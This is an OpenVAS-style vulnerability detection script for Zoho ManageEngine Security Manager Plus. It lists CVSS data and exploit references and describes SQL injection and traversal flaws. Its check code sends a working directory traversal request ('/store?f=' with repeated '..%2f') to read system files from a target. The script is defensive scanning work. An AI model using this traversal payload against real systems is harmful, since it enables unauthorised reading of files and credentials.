if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802483" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-10-22 13:33:50 +0530 (Mon, 22 Oct 2012)" );
	script_name( "Zoho ManageEngine Security Manager Plus Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/22092/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/22093/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/22094/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/117520/manageenginesmp-sql.txt" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/117522/manageengine-sql.rb.txt" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/117519/manageenginemp-traversal.txt" );
	script_xref( name: "URL", value: "http://bonitas.zohocorp.com/4264259/scanfi/31May2012/SMP_Vul_fix.zip" );
	script_xref( name: "URL", value: "http://www.manageengine.com/products/security-manager" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_require_ports( "Services/www", 6262 );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to perform
  directory traversal attacks, read/download the arbitrary files and to manipulate
  SQL queries by injecting arbitrary SQL code." );
	script_tag( name: "affected", value: "ManageEngine Security Manager Plus version 5.5 build 5505
  and prior" );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - An input passed to the 'f' parameter via 'store' script is not properly
  sanitised before being used. This allows to download the complete database
  and thus gather logins which lead to uploading web site files which could
  be used for malicious actions

  - The SQL injection is possible on the 'Advanced Search', the input is not
  validated correctly." );
	script_tag( name: "solution", value: "Apply the patch from the referenced link or update to latest version." );
	script_tag( name: "summary", value: "This host is running Zoho ManageEngine Security Manager Plus
  and is prone to multiple vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 6262 );
if(http_vuln_check( port: port, url: "/SecurityManager.cc", pattern: ">Security Manager Plus</", check_header: TRUE, extra_check: "ZOHO Corp" )){
	files = traversal_files();
	for file in keys( files ) {
		url = "/store?f=" + crap( data: "..%2f", length: 3 * 15 ) + files[file];
		if(http_vuln_check( port: port, url: url, pattern: file )){
			security_message( port: port );
			exit( 0 );
		}
	}
}

